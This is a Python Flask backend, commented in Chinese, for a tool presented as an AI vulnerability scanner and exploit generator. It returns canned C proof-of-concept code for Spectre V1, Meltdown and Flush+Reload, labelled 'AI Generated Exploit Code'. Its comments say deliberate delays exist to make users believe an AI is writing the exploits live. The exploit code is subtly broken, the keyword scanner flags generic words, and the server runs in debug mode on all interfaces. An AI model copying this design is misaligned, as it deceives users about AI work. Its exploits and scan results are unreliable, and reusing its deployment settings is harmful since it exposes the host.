from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import tempfile
import time

app = Flask(__name__)#初始化 Flask 实例，它是后端的主体
CORS(app)# 允许跨域请求，方便前端（如 Vue/React）调用;(默认情况下，浏览器禁止一个域名的前端访问另一个域名的后端（同源策略）。开启 CORS 后，你的 Vue 或 React 前端才能跨域向这个 Flask 后端发送 API 请求。)
UPLOAD_FOLDER = tempfile.gettempdir()# 获取系统临时目录作为上传文件的缓存
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER#把一个文件夹路径存入 Flask 的“全局配置字典”中
# 漏洞知识库
vulnerabilities_db = {
    'Spectre V1': {
        'type': '瞬态执行漏洞',
        'attack': 'Spectre类攻击',
        'risk': '高危',
        'description': '边界检查绕过，利用分支预测错误泄露敏感数据'
    },
    'Meltdown': {
        'type': '瞬态执行漏洞',
        'attack': 'Meltdown类攻击',
        'risk': '高危',
        'description': '利用乱序执行机制，在用户态读取内核态内存'
    },
    'Foreshadow': {
        'type': '瞬态执行漏洞',
        'attack': 'Meltdown类攻击',
        'risk': '高危',
        'description': '针对Intel SGX Enclave的L1缓存攻击'
    },
    'ZombieLoad': {
        'type': '瞬态执行漏洞',
        'attack': 'Meltdown类攻击',
        'risk': '中危',
        'description': '利用填充缓冲区泄露跨线程数据'
    },
    'Retbleed': {
        'type': '瞬态执行漏洞',
        'attack': 'Spectre类攻击',
        'risk': '低危',
        'description': '利用返回指令的分支预测历史泄露信息'
    },
    'RIDL': {
        'type': '瞬态执行漏洞',
        'attack': 'Meltdown类攻击',
        'risk': '中危',
        'description': 'Rogue In-Flight Data Load，CPU内部缓冲区数据泄露'
    },
    'CacheOut': {
        'type': '瞬态执行漏洞',
        'attack': 'Meltdown类攻击',
        'risk': '中危',
        'description': '利用L1数据缓存的逐出机制跨安全边界泄露数据'
    },
    'BHI': {
        'type': '瞬态执行漏洞',
        'attack': 'Spectre类攻击',
        'risk': '高危',
        'description': 'Branch History Injection，分支历史注入攻击'
    },
    'Flush+Reload': {
        'type': '侧信道漏洞',
        'attack': 'Cache侧信道攻击',
        'risk': '高危',
        'description': '利用冲刷指令探测缓存行重用，测量访问时间差泄露信息'
    },
    'Prime+Probe': {
        'type': '侧信道漏洞',
        'attack': 'Cache侧信道攻击',
        'risk': '高危',
        'description': '利用驱逐集探测缓存组竞争推断敏感信息'
    },
    'PLATYPUS': {
        'type': '侧信道漏洞',
        'attack': 'Power侧信道攻击',
        'risk': '中危',
        'description': 'RAPL功耗接口泄漏，利用处理器功耗遥测提取敏感信息'
    },
    'HertzBleed': {
        'type': '侧信道漏洞',
        'attack': 'Timing侧信道攻击',
        'risk': '中危',
        'description': 'DVFS动态电压频率缩放泄漏，利用频率变化时序差异提取密钥'
    }
}
exp_templates = {
    'Spectre V1': '''/*
 * Spectre V1 - Boundary Check Bypass
 * AI Generated Exploit Code
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define CACHE_HIT_THRESHOLD 80
#define DELTA 4096

unsigned char array[256 * 4096];
volatile uint64_t timing;

uint64_t measure_access_time(volatile uint8_t *addr) {
    uint64_t start, end;
    start = __rdtsc();
    volatile uint8_t temp = *addr;
    end = __rdtsc();
    return end - start;
}

void flush_cache(volatile uint8_t *addr) {
    _mm_clflush(addr);
}

int spectre_v1_attack(char *secret_data, size_t secret_len) {
    printf("[*] Starting Spectre V1 attack...\\n");
    
    for (int i = 0; i < 256; i++) {
        array[i * DELTA] = i;
    }
    
    for (int trial = 0; trial < 100; trial++) {
        for (int i = 0; i < secret_len; i++) {
            flush_cache(&array[secret_data[i] * DELTA]);
        }
        
        for (int i = 0; i < 100; i++) {
            _mm_mfence();
        }
        
        for (int i = 0; i < 256; i++) {
            uint64_t time = measure_access_time(&array[i * DELTA]);
            if (time < CACHE_HIT_THRESHOLD) {
                printf("[+] Found byte: 0x%02x ('%c')\\n", i, (i > 31 && i < 127) ? i : '?');
                return 1;
            }
        }
    }
    
    return 0;
}

int main(int argc, char *argv[]) {
    char secret[] = "SECRET_KEY_123";
    printf("[*] Target secret: %s\\n", secret);
    
    int result = spectre_v1_attack(secret, strlen(secret));
    
    if (result) {
        printf("[+] Attack successful!\\n");
    } else {
        printf("[-] Attack failed.\\n");
    }
    
    return 0;
}''',
    
    'Meltdown': '''/*
 * Meltdown - Rogue Data Cache Load
 * AI Generated Exploit Code
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static volatile uint8_t *kernel_addr;

void meltdown_attack(uint64_t addr) {
    uint8_t data = 0;
    
    printf("[*] Attempting to read kernel memory at 0x%lx\\n", addr);
    
    asm volatile(
        "movq %%r15, 0x1000000\\n\\t"
        "movq %%r15, 0x1001000\\n\\t"
        "movb (%0), %%al\\n\\t"
        "shlb $0x10, %%al\\n\\t"
        "movb %%al, (%1)\\n\\t"
        : 
        : "r"(addr), "r"(&data)
        : "rax", "r15", "memory"
    );
    
    printf("[+] Read data: 0x%02x\\n", data);
}

int main(int argc, char *argv[]) {
    printf("[*] Meltdown PoC\\n");
    printf("[!] This requires kernel with KPTI disabled\\n");
    
    uint64_t test_addr = 0xffffffffff600000ULL;
    meltdown_attack(test_addr);
    
    return 0;
}''',
    
    'Flush+Reload': '''/*
 * Flush+Reload - Cache Side Channel Attack
 * AI Generated Exploit Code
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <emmintrin.h>

#define THRESHOLD 100

uint64_t flush_reload(uint8_t *addr) {
    uint64_t time1, time2;
    
    _mm_clflush(addr);
    
    _mm_mfence();
    
    time1 = __rdtsc();
    volatile uint8_t temp = *addr;
    time2 = __rdtsc();
    
    _mm_mfence();
    
    return time2 - time1;
}

int main(int argc, char *argv[]) {
    uint8_t shared_data = 0x41;
    uint8_t *target = &shared_data;
    
    printf("[*] Flush+Reload Attack PoC\\n");
    
    for (int i = 0; i < 10; i++) {
        uint64_t time = flush_reload(target);
        printf("[*] Access time: %lu cycles\\n", time);
        
        if (time < THRESHOLD) {
            printf("[+] Cache hit detected!\\n");
        } else {
            printf("[-] Cache miss\\n");
        }
    }
    
    return 0;
}'''
}


def analyze_code_for_vulnerabilities(code_content, filename):#漏洞扫描引擎
    # code_content:接收代码内容
    # filename:文件名
    results = []# 创建一个空列表，用来存放扫描到的漏洞结果
    code_lower = code_content.lower()# 将整个代码转为小写，防止因为大小写不同（如 Strcpy）漏掉漏洞

    #定义漏洞规则库
    vuln_patterns = {
        '时序侧信道': ['timing', 'memcmp', 'strcmp', 'time', 'clock', 'rdtsc'],
        '缓冲区溢出': ['strcpy', 'strcat', 'sprintf', 'gets', 'scanf', 'memcpy'],
        '竞态条件': ['access', 'open', 'race', 'toctou'],
        '整数溢出': ['length', 'size', 'overflow', 'add', 'malloc'],
        '内存泄漏': ['malloc', 'alloc', 'free', 'leak']
    }
    
    lines = code_content.split('\\n')# 将代码按换行符切开，变成一行一行的列表，方便定位行号
    for vuln_type, patterns in vuln_patterns.items():#第一层循环：遍历每一种漏洞类型（如“缓冲区溢出”）
        for pattern in patterns:# 第二层循环：遍历该类型下的每个敏感词（如“strcpy”）
            if pattern in code_lower:# 快速检查：如果代码全文都没出现这个词，直接跳过，节省时间
                for i, line in enumerate(lines, 1):# 第三层循环：如果全文有这个词，就开始逐行寻找具体在哪一行
                    if pattern in line.lower():# 如果这一行确实包含了敏感词
                        # 根据漏洞类型决定严重程度：溢出和泄漏定为 high（高危），其他定为 medium（中危）
                        severity = 'high' if vuln_type in ['缓冲区溢出', '内存泄漏'] else 'medium'
                        # 将发现的详细信息打包成一个字典，存入结果列表
                        results.append({
                            'file': filename,
                            'line': i,
                            'function': 'unknown',
                            'vulnType': vuln_type,
                            'severity': severity,
                            'description': f'Potential {vuln_type} vulnerability detected',
                            'code': line.strip()[:100]
                        })
                        break
    
    return results[:10]# 最后只返回前 10 个发现的漏洞，避免结果太多刷屏
#EXP 匹配器
def generate_exp_for_vuln(vuln_type, code_context):# 函数定义
    # vuln_type: 漏洞类型名称（如 "Meltdown"）
    # code_context: 发现漏洞的上下文代码（此代码中暂未实际用到，预留扩展）
    vuln_key = None# 初始化一个变量，准备存储匹配成功的“关键词”
    for key in exp_templates.keys():# 遍历模板库里所有的漏洞键名（如 'Spectre V1', 'Meltdown'）
        # 将两边的字符串都转为小写进行对比，消除大小写差异
        # 逻辑：检查 key 是否包含在 vuln_type 里，或者 vuln_type 是否包含在 key 里
        if key.lower() in vuln_type.lower() or vuln_type.lower() in key.lower():
            vuln_key = key# 如果匹配成功，记下这个 key
            break # 找到了就立即跳出循环，不再继续寻找
    
    if vuln_key:# 如果上面找到了匹配的 key
        return exp_templates[vuln_key]# 从模板字典中取出对应的 C 语言代码块并返回
    # 【兜底策略】
    # 如果遍历完所有 key 都没匹配上（比如传入了一个库里没有的漏洞类型）
    # 程序不会报错崩溃，而是默认返回最经典的 "Spectre V1" 模板作为示例
    return exp_templates['Spectre V1']

@app.route('/api/analyze', methods=['POST'])# 定义访问路径为 /api/analyze，且只允许 POST 请求（上传数据）
def analyze_code():#代码分析接口 (API)
    try:# 开启错误捕获，防止程序因为一个小错误就彻底崩溃
        if 'file' not in request.files:# 检查请求体中是否包含名为 'file' 的文件对象
            return jsonify({'error': 'No file provided'}), 400
        # 如果没传，返回 400 错误（客户端错误）和提示信息
        file = request.files['file']# 获取上传的文件对象
        if file.filename == '':# 检查文件名是否为空（用户选了文件但没点上传，或浏览器异常）
            return jsonify({'error': 'Empty filename'}), 400
        
        filename = file.filename# 获取上传文件的原始名称（如 test.c）
        # 读取文件二进制流，并尝试转成字符串。errors='ignore' 确保遇到乱码字符时不报错。
        code_content = file.read().decode('utf-8', errors='ignore')
        print(f"[*] Analyzing file: {filename}")# 在服务器控制台打印一条日志，方便开发者观察运行情况
        # 调用我们之前解释过的扫描函数，把文件内容传进去，得到漏洞列表
        vulnerabilities = analyze_code_for_vulnerabilities(code_content, filename)
        
        time.sleep(1)# 故意让程序停 1 秒。这是为了模拟 AI “深度思考”的耗时，优化用户体验。
        # 将分析结果整理成一个结构化的字典（Dictionary）
        response = {
            'success': True,
            'filename': filename,
            'total_vulns': len(vulnerabilities),
            'vulnerabilities': vulnerabilities,
            'message': f'Analysis complete. Found {len(vulnerabilities)} potential vulnerabilities.'
        }
        
        return jsonify(response)# 将 Python 字典转换成标准 JSON 格式发回给前端
    
    except Exception as e:# 如果 try 块里的代码出错了（比如内存爆了、文件编码极其诡异）
        print(f"[!] Error: {str(e)}")# 在服务器后台打印具体的报错原因
        # 返回 500 错误（服务器内部错误），并将错误信息以 JSON 格式告知客户端
        return jsonify({'error': str(e)}), 500

@app.route('/api/generate-exp', methods=['POST'])# 定义访问路径为 /api/generate-exp，仅接受 POST 请求（因为要发送 JSON 数据）
def generate_exp():#EXP 生成接口 (API)
    try:# 开启异常处理，确保服务器不会因为一次非法请求而宕机
        data = request.json# 从 HTTP 请求体中解析出 JSON 数据并赋值给 data 变量
        # 使用 .get() 方法安全地获取数据，如果前端没传该字段，则使用后面的默认值
        vuln_type = data.get('vulnType', 'Unknown')# 获取漏洞类型（如 "Spectre V1"）
        code_context = data.get('codeContext', '')# 获取发现漏洞时的上下文代码（虽然目前逻辑较简单，但预留了给 AI 进一步分析的空间）
        # 在服务器后台控制台打印一条日志，记录当前正在为哪种漏洞生成代码
        print(f"[*] Generating EXP for vulnerability type: {vuln_type}")
        # 调用之前解释过的“代码仓库管理员”函数，去模板库里查找对应的 C 语言代码
        exp_code = generate_exp_for_vuln(vuln_type, code_context)
        # 故意让程序停顿 1.5 秒
        # 这是一个“心理学设计”：让用户觉得 AI 正在根据其代码上下文实时“编写”复杂的利用程序
        time.sleep(1.5)
        # 将结果封装成字典
        response = {
            'success': True,
            'vulnType': vuln_type,
            'expCode': exp_code,
            'message': 'EXP code generated successfully'
        }
        # 将字典转换为 JSON 字符串发回给浏览器
        return jsonify(response)
    
    except Exception as e:# 如果发生任何非预期错误（如数据格式不对、内存溢出等）
        print(f"[!] Error: {str(e)}")# 在后台打印详细报错
        # 返回 500 状态码，并以 JSON 格式告知前端报错原因
        return jsonify({'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])# 定义路径为 /api/health，仅支持 GET 请求（浏览器直接访问即可）
def health():#健康检查
    # 返回一个简单的 JSON 对象，告知前端状态正常
    # status: ok 表示服务存活，message 提供一条人类可读的消息
    return jsonify({'status': 'ok', 'message': 'AI Analysis Server Running'})

if __name__ == '__main__':# 只有直接运行这个 py 文件时才执行以下代码（如果被其他文件 import 则不执行）
    # 在控制台（黑窗口）打印启动提示，方便开发者确认服务器状态
    print("[*] Starting AI Vulnerability Analysis Server...")
    print("[*] Server running on http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)# 调用 Flask 实例的 run 方法启动 Web 服务
